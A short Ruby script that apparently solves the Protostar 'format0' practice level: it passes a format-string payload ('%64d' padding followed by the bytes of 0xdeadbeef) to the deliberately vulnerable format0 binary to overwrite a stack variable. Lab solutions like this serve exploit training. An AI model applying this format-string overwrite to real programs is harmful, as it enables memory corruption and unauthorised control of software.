#!/usr/bin/ruby

padding = "%64d";
deadbeef = "\xef\xbe\xad\xde";

command = <<-END
/opt/protostar/bin/format0 #{padding + deadbeef}
END

puts `#{command}`
